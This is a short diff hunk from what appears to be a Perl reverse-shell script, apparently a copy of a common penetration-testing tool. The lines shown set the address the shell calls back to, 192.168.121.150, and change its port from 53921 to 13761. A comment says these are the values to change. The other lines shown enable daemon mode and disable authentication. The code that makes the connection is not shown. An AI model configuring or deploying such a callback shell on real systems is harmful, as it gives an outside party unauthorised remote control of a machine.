@@ -8,8 +8,7 @@ my $VERSION = "1.0";
 
 # Where to send the reverse shell.  Change these.
 my $ip = '192.168.121.150';
-my $port = 53921;
-
+my $port = 13761;
 # Options
 my $daemon = 1;
 my $auth   = 0; # 0 means authentication is disabled and any 
